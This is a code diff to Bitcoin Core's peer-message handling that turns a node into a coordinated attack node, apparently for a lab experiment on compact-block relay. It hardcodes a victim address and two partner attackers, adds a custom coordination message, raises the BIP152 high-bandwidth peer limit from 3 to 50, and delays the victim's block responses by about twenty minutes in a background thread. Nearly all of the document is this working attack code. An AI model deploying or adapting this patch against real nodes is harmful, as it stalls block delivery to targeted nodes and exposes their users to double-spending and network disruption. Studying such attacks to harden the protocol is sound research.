@@ -31,13 +31,30 @@
 #include <utilstrencodings.h>
 
 #include <memory>
+#include <chrono>
+#include <thread>
+#include "boost/thread.hpp"
+#include <set>
+#include <string>
+#include <iostream>
 
 #if defined(NDEBUG)
 # error "Bitcoin cannot be compiled without assertions."
 #endif
 
-std::atomic<int64_t> nTimeBestReceived(0); // Used only to inform the wallet of when we last received a block
+/*
+ * 0: initial state, send compact blocks
+ * 1: phase 1 succeed, send headers message
+ */
+int attack_state = 0;
+int new_getdata_requested = 0;
+/*
+ * attacker maintained set of attack nodes that are currently in victim's HBN list
+ */
+std::set<int> hb_list;
 
+std::chrono::time_point<std::chrono::system_clock> now;
+std::atomic<int64_t> nTimeBestReceived(0); // Used only to inform the wallet of when we last received a block
 struct IteratorComparator
 {
     template<typename I>
@@ -420,7 +437,11 @@ void MaybeSetPeerAsAnnouncingHeaderAndIDs(NodeId nodeid, CConnman* connman) {
         }
         connman->ForNode(nodeid, [connman](CNode* pfrom){
             uint64_t nCMPCTBLOCKVersion = (pfrom->GetLocalServices() & NODE_WITNESS) ? 2 : 1;
-            if (lNodesAnnouncingHeaderAndIDs.size() >= 3) {
+            /*
+             * Ignore the limit on the size of attack node's HBN list.
+             * tell every node to send us compact blocks directly.
+             */
+            if (lNodesAnnouncingHeaderAndIDs.size() >= 50) {
                 // As per BIP152, we only get 3 of our peers to announce
                 // blocks using compact encodings.
                 connman->ForNode(lNodesAnnouncingHeaderAndIDs.front(), [connman, nCMPCTBLOCKVersion](CNode* pnodeStop){
@@ -1040,11 +1061,33 @@ static void RelayAddress(const CAddress& addr, bool fReachable, CConnman* connma
     connman->ForEachNodeThen(std::move(sortfunc), std::move(pushfunc));
 }
 
+/*
+ * The function that actually delays the response to victim's getdata request.
+ * Dispatched to a different thread so the 10-minute blocking has no impact on other operations of the attack node.
+ */
+void static delay_attack(CNode* pfrom, CConnman* connman, CNetMsgMaker msgMaker, std::shared_ptr<const CBlock> block,
+                         std::shared_ptr<const CBlockHeaderAndShortTxIDs> compactBlock, int sendType, int sendflags, int delay_in_milli) {
+    LogPrint(BCLog::NET, "entering attack thread\n");
+    std::this_thread::sleep_for(std::chrono::milliseconds(delay_in_milli));
+    if (sendType==0) {
+        connman->PushMessage(pfrom, msgMaker.Make(SERIALIZE_TRANSACTION_NO_WITNESS, NetMsgType::BLOCK, *block));
+    } else if (sendType==1){
+        connman->PushMessage(pfrom, msgMaker.Make(NetMsgType::BLOCK, *block));
+    } else {
+        connman->PushMessage(pfrom, msgMaker.Make(sendflags, NetMsgType::CMPCTBLOCK, *compactBlock));
+    }
+    LogPrint(BCLog::NET, "leaving attack thread\n");
+}
+
 void static ProcessGetBlockData(CNode* pfrom, const Consensus::Params& consensusParams, const CInv& inv, CConnman* connman, const std::atomic<bool>& interruptMsgProc)
 {
     bool send = false;
     std::shared_ptr<const CBlock> a_recent_block;
     std::shared_ptr<const CBlockHeaderAndShortTxIDs> a_recent_compact_block;
+    /*
+     * TODO: remove the hardcode of the victim's IP address
+     */
+    std::string target("10.1.2.4");
     bool fWitnessesPresentInARecentCompactBlock;
     {
         LOCK(cs_most_recent_block);
@@ -1081,6 +1124,12 @@ void static ProcessGetBlockData(CNode* pfrom, const Consensus::Params& consensus
         send = BlockRequestAllowed(mi->second, consensusParams);
         if (!send) {
             LogPrint(BCLog::NET, "%s: ignoring request from peer=%i for old block that isn't in the main chain\n", __func__, pfrom->GetId());
+            /*
+             * If we get here, it means the attack node successfully sent a headers message earlier than other nodes,
+             * and the victim has sent us a getdata request. However, we haven't really got this block so set the
+             * following boolean to 1. Later when we receive the new block, we can process accordingly.
+             */
+            new_getdata_requested = 1;
         }
     }
     const CNetMsgMaker msgMaker(pfrom->GetSendVersion());
@@ -1118,10 +1167,24 @@ void static ProcessGetBlockData(CNode* pfrom, const Consensus::Params& consensus
                 assert(!"cannot load block from disk");
             pblock = pblockRead;
         }
-        if (inv.type == MSG_BLOCK)
-            connman->PushMessage(pfrom, msgMaker.Make(SERIALIZE_TRANSACTION_NO_WITNESS, NetMsgType::BLOCK, *pblock));
-        else if (inv.type == MSG_WITNESS_BLOCK)
-            connman->PushMessage(pfrom, msgMaker.Make(NetMsgType::BLOCK, *pblock));
+        if (inv.type == MSG_BLOCK) {
+            LogPrint(BCLog::NET, "A regular block requested.\n");
+            if (pfrom->addr.ToString().find(target) == 0) {
+                boost::thread test_thr(boost::bind(&delay_attack, pfrom, connman, msgMaker, pblock, a_recent_compact_block, 0, 0, 1250*1000));
+            } else {
+                connman->PushMessage(pfrom,
+                                     msgMaker.Make(SERIALIZE_TRANSACTION_NO_WITNESS, NetMsgType::BLOCK, *pblock));
+            }
+        }
+        else if (inv.type == MSG_WITNESS_BLOCK) {
+            LogPrint(BCLog::NET, "A witness block requested.\n");
+            if (pfrom->addr.ToString().find(target) == 0) {
+                // destination is victim, pass to attack thread
+                boost::thread test_thr(boost::bind(&delay_attack, pfrom, connman, msgMaker, pblock, a_recent_compact_block, 1, 0, 1250*1000));
+            } else {
+                connman->PushMessage(pfrom, msgMaker.Make(NetMsgType::BLOCK, *pblock));
+            }
+        }
         else if (inv.type == MSG_FILTERED_BLOCK)
         {
             bool sendMerkleBlock = false;
@@ -1158,10 +1221,18 @@ void static ProcessGetBlockData(CNode* pfrom, const Consensus::Params& consensus
             int nSendFlags = fPeerWantsWitness ? 0 : SERIALIZE_TRANSACTION_NO_WITNESS;
             if (CanDirectFetch(consensusParams) && mi->second->nHeight >= chainActive.Height() - MAX_CMPCTBLOCK_DEPTH) {
                 if ((fPeerWantsWitness || !fWitnessesPresentInARecentCompactBlock) && a_recent_compact_block && a_recent_compact_block->header.GetHash() == mi->second->GetBlockHash()) {
-                    connman->PushMessage(pfrom, msgMaker.Make(nSendFlags, NetMsgType::CMPCTBLOCK, *a_recent_compact_block));
+                    LogPrint(BCLog::NET, "A witness compact block requested.\n");
+                    if (pfrom->addr.ToString().find(target) == 0) {
+                        boost::thread test_thr(boost::bind(&delay_attack, pfrom, connman, msgMaker, pblock, a_recent_compact_block, 2, nSendFlags, 1250*1000));
+                    } else {
+                        connman->PushMessage(pfrom, msgMaker.Make(nSendFlags, NetMsgType::CMPCTBLOCK,
+                                                                  *a_recent_compact_block));
+                    }
+
                 } else {
                     CBlockHeaderAndShortTxIDs cmpctblock(*pblock, fPeerWantsWitness);
                     connman->PushMessage(pfrom, msgMaker.Make(nSendFlags, NetMsgType::CMPCTBLOCK, cmpctblock));
+                    LogPrint(BCLog::NET, "A non-witness compact block requested.\n");
                 }
             } else {
                 connman->PushMessage(pfrom, msgMaker.Make(nSendFlags, NetMsgType::BLOCK, *pblock));
@@ -1197,7 +1268,7 @@ void static ProcessGetData(CNode* pfrom, const Consensus::Params& consensusParam
                 return;
             // Don't bother if send buffer is too full to respond anyway
             if (pfrom->fPauseSend)
-                break;
+               break;
 
             const CInv &inv = *it;
             it++;
@@ -1492,7 +1563,11 @@ bool static ProcessHeadersMessage(CNode *pfrom, CConnman *connman, const std::ve
 
 bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStream& vRecv, int64_t nTimeReceived, const CChainParams& chainparams, CConnman* connman, const std::atomic<bool>& interruptMsgProc)
 {
-    LogPrint(BCLog::NET, "received: %s (%u bytes) peer=%d\n", SanitizeString(strCommand), vRecv.size(), pfrom->GetId());
+    LogPrint(BCLog::NET, "received: %s (%u bytes) peer=%s\n", SanitizeString(strCommand), vRecv.size(), pfrom->addr.ToString());
+    /*
+     * TODO: remove the hard code of victim's IP address
+     */
+    std::string target("10.1.2.4");
     if (gArgs.IsArgSet("-dropmessagestest") && GetRand(gArgs.GetArg("-dropmessagestest", 0)) == 0)
     {
         LogPrintf("dropmessagestest DROPPING RECV MESSAGE\n");
@@ -1753,7 +1828,10 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
             // cmpctblock messages.
             // We send this to non-NODE NETWORK peers as well, because
             // they may wish to request compact blocks from us
-            bool fAnnounceUsingCMPCTBLOCK = false;
+            /*
+             * telling every node we want compact blocks
+             */
+            bool fAnnounceUsingCMPCTBLOCK = true;
             uint64_t nCMPCTBLOCKVersion = 2;
             if (pfrom->GetLocalServices() & NODE_WITNESS)
                 connman->PushMessage(pfrom, msgMaker.Make(NetMsgType::SENDCMPCT, fAnnounceUsingCMPCTBLOCK, nCMPCTBLOCKVersion));
@@ -1761,6 +1839,45 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
             connman->PushMessage(pfrom, msgMaker.Make(NetMsgType::SENDCMPCT, fAnnounceUsingCMPCTBLOCK, nCMPCTBLOCKVersion));
         }
         pfrom->fSuccessfullyConnected = true;
+    }
+
+    /*
+     * The code to handle coordination among attack nodes.
+     */
+    else if (strCommand == NetMsgType::ATTMSG)
+    {
+        int good_news = 0;
+        vRecv >> good_news;
+        LogPrint(BCLog::NET, "received attacking message, good news: %s from peer %s!\n", good_news, pfrom->addr.ToString());
+        bool fsendcompact_update = false;
+        uint64_t block_version_update = 1;
+        if (good_news) {
+            hb_list.insert(pfrom->GetId());
+            if (hb_list.size()==3 && attack_state == 0) {
+                attack_state = 1;
+                // tell other neighbors we don't want compact blocks.
+                connman->ForEachNode([&connman, &msgMaker, &block_version_update, &fsendcompact_update](CNode* pnode)
+                                     {
+                                         block_version_update = 1;
+                                         connman->PushMessage(pnode, msgMaker.Make(NetMsgType::SENDCMPCT, fsendcompact_update, block_version_update));
+                                         block_version_update = 2;
+                                         connman->PushMessage(pnode, msgMaker.Make(NetMsgType::SENDCMPCT, fsendcompact_update, block_version_update));
+                                     });
+            }
+        }
+        else {
+            hb_list.erase(pfrom->GetId());
+            attack_state = 0;
+            fsendcompact_update = true;
+            // tell other neighbors we want compact blocks.
+            connman->ForEachNode([&connman, &msgMaker, &block_version_update, &fsendcompact_update](CNode* pnode)
+                                 {
+                                     block_version_update = 1;
+                                     connman->PushMessage(pnode, msgMaker.Make(NetMsgType::SENDCMPCT, fsendcompact_update, block_version_update));
+                                     block_version_update = 2;
+                                     connman->PushMessage(pnode, msgMaker.Make(NetMsgType::SENDCMPCT, fsendcompact_update, block_version_update));
+                                 });
+        }
     }
 
     else if (!pfrom->fSuccessfullyConnected)
@@ -1839,8 +1956,61 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
                 State(pfrom->GetId())->fProvidesHeaderAndIDs = true;
                 State(pfrom->GetId())->fWantsCmpctWitness = nCMPCTBLOCKVersion == 2;
             }
-            if (State(pfrom->GetId())->fWantsCmpctWitness == (nCMPCTBLOCKVersion == 2)) // ignore later version announces
+            // ignore SendCompact request from victim
+            if ((pfrom->addr.ToString().find(target) != 0) && (State(pfrom->GetId())->fWantsCmpctWitness == (nCMPCTBLOCKVersion == 2))) // ignore later version announces
                 State(pfrom->GetId())->fPreferHeaderAndIDs = fAnnounceUsingCMPCTBLOCK;
+            /*
+             * customized code to hand victim's sendcmpct message
+             */
+            if (pfrom->addr.ToString().find(target) == 0) {
+                /*
+                 * TODO: remove the hard code of the IP address of other attack nodes.
+                 */
+                struct in_addr friend1_in_addr = { .s_addr = inet_addr("10.1.2.2") };
+                struct in_addr friend2_in_addr = { .s_addr = inet_addr("10.1.2.3") };
+                CNode* pfriend1 = connman->FindNode((CNetAddr)friend1_in_addr);
+                CNode* pfriend2 = connman->FindNode((CNetAddr)friend2_in_addr);
+                bool fsendcompact_update = false;
+                uint64_t block_version_update = 1;
+                /*
+                 * Let other attack nodes know that I am added to/removed from the victim's HBN list
+                 */
+                int good_news = 0;
+                if (fAnnounceUsingCMPCTBLOCK) {
+                    good_news = 1;
+                    // add myself to the hb list
+                    hb_list.insert(-1);
+                    if (hb_list.size()==3 && attack_state == 0) {
+                        attack_state = 1;
+                        // now tell other neighbors that we don't want compact blocks
+                        connman->ForEachNode([&connman, &msgMaker, &block_version_update, &fsendcompact_update](CNode* pnode)
+                                             {
+                                                 block_version_update = 1;
+                                                 connman->PushMessage(pnode, msgMaker.Make(NetMsgType::SENDCMPCT, fsendcompact_update, block_version_update));
+                                                 block_version_update = 2;
+                                                 connman->PushMessage(pnode, msgMaker.Make(NetMsgType::SENDCMPCT, fsendcompact_update, block_version_update));
+                                             });
+                    }
+                }
+                else {
+                    hb_list.erase(-1);
+                    attack_state = 0;
+                    fsendcompact_update = true;
+                    // tell other neighbors we want compact blocks.
+                    connman->ForEachNode([&connman, &msgMaker, &block_version_update, &fsendcompact_update](CNode* pnode)
+                                         {
+                                             block_version_update = 1;
+                                             connman->PushMessage(pnode, msgMaker.Make(NetMsgType::SENDCMPCT, fsendcompact_update, block_version_update));
+                                             block_version_update = 2;
+                                             connman->PushMessage(pnode, msgMaker.Make(NetMsgType::SENDCMPCT, fsendcompact_update, block_version_update));
+                                         });
+                }
+                if (pfriend1)
+                    connman->PushMessage(pfriend1, msgMaker.Make(NetMsgType::ATTMSG, good_news));
+                if (pfriend2)
+                    connman->PushMessage(pfriend2, msgMaker.Make(NetMsgType::ATTMSG, good_news));
+            }
+
             if (!State(pfrom->GetId())->fSupportsDesiredCmpctVersion) {
                 if (pfrom->GetLocalServices() & NODE_WITNESS)
                     State(pfrom->GetId())->fSupportsDesiredCmpctVersion = (nCMPCTBLOCKVersion == 2);
@@ -1919,8 +2089,7 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
             Misbehaving(pfrom->GetId(), 20);
             return error("message getdata size() = %u", vInv.size());
         }
-
-        LogPrint(BCLog::NET, "received getdata (%u invsz) peer=%d\n", vInv.size(), pfrom->GetId());
+        LogPrint(BCLog::NET, "received getdata (%u invsz) peer=%d\n", vInv.size(), pfrom->addr.ToString());
 
         if (vInv.size() > 0) {
             LogPrint(BCLog::NET, "received getdata for: %s peer=%d\n", vInv[0].ToString(), pfrom->GetId());
@@ -2296,6 +2465,19 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
         CBlockHeaderAndShortTxIDs cmpctblock;
         vRecv >> cmpctblock;
 
+        // directly send the compact block to the victim
+        /*
+         * TODO: remove the hard code of the IP address of the victim node
+         */
+        struct in_addr victim_in_addr = { .s_addr = inet_addr("10.1.2.4") };
+        CNode* pvictim = connman->FindNode((CNetAddr)victim_in_addr);
+
+        if (pvictim && (attack_state == 0 || new_getdata_requested == 1)) {
+            connman->PushMessage(pvictim, msgMaker.Make(NetMsgType::CMPCTBLOCK, cmpctblock));
+            LogPrintf("***Sending a compact block directly to victim***");
+            new_getdata_requested = 0;
+        }
+
         bool received_new_header = false;
 
         {
@@ -2328,6 +2510,10 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
                 return true;
             }
         }
+        now = std::chrono::system_clock::now();
+        auto duration = now.time_since_epoch();
+        auto millis = std::chrono::duration_cast<std::chrono::milliseconds>(duration).count();
+        LogPrintf("***received compact block***%d*** %s peer=%d\n", millis, cmpctblock.header.GetHash().ToString(), pfrom->GetId());
 
         // When we succeed in decoding a block's txids from a cmpctblock
         // message we typically jump to the BLOCKTXN handling code, with a
@@ -2510,6 +2696,7 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
                 // can't be used to interfere with block relay.
                 MarkBlockAsReceived(pblock->GetHash());
             }
+            
         }
 
     }
@@ -2593,6 +2780,7 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
     else if (strCommand == NetMsgType::HEADERS && !fImporting && !fReindex) // Ignore headers received while importing
     {
         std::vector<CBlockHeader> headers;
+        std::vector<CBlock> headers_to_victim;
 
         // Bypass the normal CBlock deserialization, as we don't want to risk deserializing 2000 full blocks.
         unsigned int nCount = ReadCompactSize(vRecv);
@@ -2605,6 +2793,18 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
         for (unsigned int n = 0; n < nCount; n++) {
             vRecv >> headers[n];
             ReadCompactSize(vRecv); // ignore tx count; assume it is 0.
+        }
+        /*
+         * TODO: reomve the hard coding of victim's IP address
+         */
+        // directly send the headers to the victim
+        struct in_addr victim_in_addr = { .s_addr = inet_addr("10.1.2.4") };
+        CNode* pvictim = connman->FindNode((CNetAddr)victim_in_addr);
+
+        if(pvictim && (attack_state > 0)) {
+            headers_to_victim.push_back(headers[0]);
+            connman->PushMessage(pvictim, msgMaker.Make(NetMsgType::HEADERS, headers_to_victim));
+            LogPrintf("***Sending a headers message directly to victim***");
         }
 
         // Headers received via a HEADERS message should be valid, and reflect
@@ -2620,7 +2820,11 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
         std::shared_ptr<CBlock> pblock = std::make_shared<CBlock>();
         vRecv >> *pblock;
 
-        LogPrint(BCLog::NET, "received block %s peer=%d\n", pblock->GetHash().ToString(), pfrom->GetId());
+        now = std::chrono::system_clock::now();
+        auto duration = now.time_since_epoch();
+        auto millis = std::chrono::duration_cast<std::chrono::milliseconds>(duration).count();
+
+        LogPrintf("***received block***%d*** %s peer=%d\n", millis, pblock->GetHash().ToString(), pfrom->GetId());
 
         bool forceProcessing = false;
         const uint256 hash(pblock->GetHash());
